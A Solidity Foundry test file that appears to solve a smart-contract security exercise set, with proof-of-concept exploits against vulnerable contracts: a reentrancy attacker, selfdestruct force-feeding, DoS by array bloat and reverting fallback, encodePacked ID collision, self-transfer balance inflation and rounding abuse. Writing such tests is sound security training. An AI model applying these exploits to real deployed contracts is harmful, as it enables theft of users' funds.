// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/Main.sol";


contract StoreTest is Test {
    Store store;
    bool fillSafesArray;

    function setUp() public {
        store = new Store();

        
        if (fillSafesArray) {
            
            uint256 numEntries = 100000; 
            for (uint256 i = 0; i < numEntries; i++) {
                address attacker = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
                vm.deal(attacker, 1 wei);
                vm.prank(attacker);
                store.store{value: 1 wei}();
            }
        }
    }

    function testTakeFunctionDos() public {
        fillSafesArray = true;
        setUp();


        address legitimateUser = address(0xBEEF);
        vm.deal(legitimateUser, 1 ether);
        vm.prank(legitimateUser);
        store.store{value: 1 ether}();

        vm.prank(legitimateUser);
        uint256 gasLimit = 8_000_000;
        (bool success, ) = address(store).call{gas: gasLimit}(
            abi.encodeWithSelector(store.take.selector)
        );

        assertFalse(success, "Expected take func to fail");

        emit log("failed - (DoS condition simulated)");
    }

    function testTakeFunctionSuccess() public {
        fillSafesArray = false;
        setUp();
        
        address user = address(0xCAFE);
        vm.deal(user, 1 ether);
        vm.prank(user);
        store.store{value: 1 ether}();

        vm.prank(user);
        store.take();

        uint256 userBalance = user.balance;
        assertEq(userBalance, 1 ether, "withdraw 1 ether");

        emit log("take func succeeded");
    }
}

contract DiscountedBuyTest is Test {
    DiscountedBuy public discountedBuy;
    address public user;

    function setUp() public {
        discountedBuy = new DiscountedBuy();
        user = address(0x1234);
        vm.deal(user, 10 ether);
    }

    function testIntegerTruncationBug() public {
        vm.startPrank(user);

        uint price1 = discountedBuy.price();
        discountedBuy.buy{value: price1}();
        assertEq(discountedBuy.objectBought(user), 1, "User should have 1 item");

       
        uint price2 = discountedBuy.price();
        discountedBuy.buy{value: price2}();
        assertEq(discountedBuy.objectBought(user), 2, "User should have 2 items");

        uint price3 = discountedBuy.price();
        vm.expectRevert();
        discountedBuy.buy{value: price3}();

        vm.stopPrank();
    }
}


contract HeadOrTailTest is Test {
    HeadOrTail public headortail;

    function setUp() public {
        headortail = new HeadOrTail();
    }

    function testReadLastChoiceHead() public {
        address user = address(0xBEEF);
        vm.deal(user, 2 ether);

        vm.prank(user);
        headortail.choose{value: 1 ether}(true); //lastChoiceHead = true
        bytes32 slot0 = vm.load(address(headortail), bytes32(uint256(0)));

        // 0x00000000000000000000000000000000000000000000000000000000beefXX01 (XX = lastChoiceHeadByte)
        emit log_named_bytes32("Storage slot 0 content:", slot0);
        uint8 lastChoiceHeadByte = uint8(uint256(slot0));
        assertEq(lastChoiceHeadByte, 1, "lastChoiceHead should be true");
    }
}


contract AttackerVaultTest {
    Vault public vault;
    address public owner;
    bool public reentered;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    receive() external payable {
        vault.redeem();
    }

    function attack() external {
        vault.store{ value: 1 ether }();
        vault.redeem();
    }
}


contract VaultTest is Test {
    Vault public vault;
    AttackerVaultTest public attacker;
    address public legitUser;

    function setUp() public {
        vault = new Vault();
        vm.deal(address(vault), 2 ether);
    }

    function testReentrancyAttack() public {
        attacker = new AttackerVaultTest(address(vault));
        vm.deal(address(attacker), 1 ether);
        attacker.attack();
        emit log_named_uint("attacker balance", address(attacker).balance);
        assert(address(attacker).balance > 1 ether);
    }
}


contract SimpleTokenTest is Test{
    SimpleToken public simpletoken;
    address public user = address(0xBEEF);
    function setUp() public{
        vm.prank(user);
        simpletoken = new SimpleToken();
    }
    function testNegativeBalance() public{
        vm.prank(user);
        simpletoken.sendToken(address(1), 10); //bad user = address(1)
        vm.prank(address(1));
        simpletoken.sendToken(address(2), 1000); //another bad user = address(1)
        emit log_named_int("address(2) balance", simpletoken.balances(address(1))); //-990
        assert(simpletoken.balances(address(1)) < 0);
    }
}


contract LinearBondedCurveTest is Test {
    LinearBondedCurve public lbc;
    
    function setUp() public {
        lbc = new LinearBondedCurve();
        vm.deal(address(lbc), 2 ether);
    }

    function testProfit() public {
        address attacker = address(100); // Changed from address(1) to address(100)
        vm.deal(attacker, 1 ether);

        vm.prank(attacker);
        lbc.buy{ value: 1 ether }();

        vm.prank(attacker);
        lbc.sell(1e18);

        assert(attacker.balance > 1 ether);
    }
}


contract CoffersTest is Test{
    Coffers public coffer ;
    function setUp() public{
        coffer = new Coffers();
        vm.deal(address(coffer), 10 ether);
    }

    function testCloseAccountThencreateCoffer() public{
        address attacker = address(123);
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        coffer.createCoffer(2);
        coffer.deposit{value : 1 ether}(attacker, 1);
        coffer.closeAccount();
        coffer.createCoffer(2);
        coffer.closeAccount();
        vm.stopPrank();
        assert(attacker.balance > 1 ether);
        emit log_named_uint("attacker balance", attacker.balance);
    }
}


contract CommonCoffersTest is Test{
    CommonCoffers public commoncoffers;
    function setUp() public{
        commoncoffers = new CommonCoffers();
    }
    function testDonationAttack() public{
        address alice = address(12);
        vm.deal(alice, 1 ether);
        emit log_named_uint("alice account balance ", alice.balance);
        vm.prank(alice);
        commoncoffers.deposit{value : 1 ether}(alice);
        emit log_named_uint("alice coffers mapping value : ", commoncoffers.coffers(alice));
        emit log_named_uint("alice account balance ", alice.balance);
        vm.prank(alice);
        commoncoffers.withdraw(0.005 ether);
        emit log_named_uint("alice account balance ", alice.balance);
        emit log_named_uint("alice coffers mapping value after reciveing 0.005 ether : ", commoncoffers.coffers(alice));
    }

}

contract RegistryAttacker {
    fallback() external payable{
        revert("fuck u (=");
    }
}

contract ResolverTest is Test{
    Resolver public resolver;
    RegistryAttacker public attackerContract;
    address public owner = address(0xBEEF); 
    address public legitParty;
    function setUp() public{
        vm.prank(owner);
        resolver =  new Resolver(1e18);
        attackerContract = new RegistryAttacker();
        legitParty = address(12);
        vm.deal(address(attackerContract), 2 ether);
        vm.deal(legitParty, 1 ether);
    }

    function testDOS() public{
        vm.prank(legitParty);
        resolver.deposit{value : 1 ether}(Resolver.Side(0));

        vm.prank(address(attackerContract));
        resolver.deposit{value : 2 ether}(Resolver.Side(1));

        vm.prank(owner);
        resolver.declareWinner(Resolver.Side(0));

        vm.prank(legitParty);
        vm.expectRevert();
        resolver.payReward();
    }
}

contract RegistryTest is Test{
    Registry public registry;
    function setUp() public {
        registry = new Registry();
    }
    function getRegAddress(string memory _name, string memory _surname, uint _nonce) public view returns (address payable) {
        bytes32 ID = keccak256(abi.encodePacked(_name, _surname, _nonce));
        (address payable regAddress, , , , , ) = registry.users(ID);
        return regAddress;
    }

    function testDifAccountSameId() public{
        address legitUser = address(12);
        address attacker = address(13);
        vm.prank(legitUser);
        registry.register("Danial", "Hamedi", 24);
        emit log_named_address("legit user reg address: ", getRegAddress("Danial", "Hamedi", 24));
        vm.prank(attacker);
        registry.register("Dania", "lHamedi", 24);
        emit log_named_address("legit user reg address (after overR)): ", getRegAddress("Danial", "Hamedi", 24));
        assert(getRegAddress("Danial", "Hamedi", 24) != legitUser);
    }

}
contract SnapShotTokenTest is Test{
    SnapShotToken public snapshottoken;
    address public attacker;
    function setUp() public{
        attacker = address(12);
        snapshottoken = new SnapShotToken();
    }

    function prep() public{
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        snapshottoken.buyToken{value : 1 ether}();
    }

    function testFromSameTo() public{
        prep();
        vm.prank(attacker);
        snapshottoken.transfer(attacker, 1); // 1 + 1 = 2
        assert(snapshottoken.balances(attacker) > 1);
    }

}


contract PiggyBankTestAttacker {
    function attack(address piggybank) public {
        selfdestruct(payable(piggybank));
    }
}


contract PiggyBankTest is Test{
    PiggyBank public piggybank;
    address public owner;
    PiggyBankTestAttacker public attacker;
    function setUp() public{
        owner = address(12);
        vm.prank(owner);
        piggybank = new PiggyBank();
        vm.deal(owner, 10 ether);
        attacker = new PiggyBankTestAttacker();
    }

    function testOwnerGriefed() public{
        vm.startPrank(owner);
        for (uint i = 0; i < 10; i++){
            piggybank.deposit{value : 1 ether}(); // balance = 9
        }
        vm.stopPrank();
        vm.deal(address(attacker), 0.5 ether);
        attacker.attack(address(piggybank));

        vm.prank(owner);
        vm.expectRevert();
        piggybank.withdrawAll();

    }



}

contract WinnerTakesAllTest is Test{
    WinnerTakesAll public winnertakesall;
    address public owner = address(12);
    address public user = address(13);
    function setUp() public{
        vm.prank(owner);
        winnertakesall = new WinnerTakesAll();
        vm.deal(owner, 10 ether);
    }
    
    function createRoundandAllowUser() public{
        vm.startPrank(owner);
        winnertakesall.createNewRounds(1);
        winnertakesall.setRewardsAtRound{value : 1 ether}(0);
        address[] memory recipients = new address[](1);
        recipients[0] = address(13);
        winnertakesall.setRewardsAtRoundfor(0, recipients);
    }

    function testUserAllowed() public{
        createRoundandAllowUser();
        assert(winnertakesall.isAllowedAt(0, user));
    }

    function testUserAllowedAfterclearRounds() public{
        createRoundandAllowUser();
        vm.startPrank(owner);
        winnertakesall.clearRounds();
        winnertakesall.createNewRounds(1);
        assert(winnertakesall.isAllowedAt(0, user));
    }
}

contract GuessTheAverageTest is Test{
    GuessTheAverage public guesstheaverage;
    function setUp() public{
        guesstheaverage =  new GuessTheAverage(1000,1000);
    }

    function testDOSguessTheAverageTest() public{
        address BadUser = address(13);
        address legitUser = address(14);
        vm.warp(guesstheaverage.start());
        vm.deal(BadUser, 1 ether);
        vm.prank(BadUser);
        guesstheaverage.guess{value : 1 ether} (keccak256(abi.encodePacked(BadUser, UINT256_MAX, bytes32(uint(10)))));

        vm.deal(legitUser, 1 ether);
        vm.prank(legitUser);
        guesstheaverage.guess{value : 1 ether} (keccak256(abi.encodePacked(legitUser, uint(1), bytes32(uint(11)))));

        vm.warp(guesstheaverage.start() + 1000 + 1);
        vm.prank(BadUser);
        guesstheaverage.reveal(UINT256_MAX, bytes32(uint(10)));

        vm.prank(legitUser);
        vm.expectRevert();
        guesstheaverage.reveal(uint(1), bytes32(uint(11)));
        
    }
}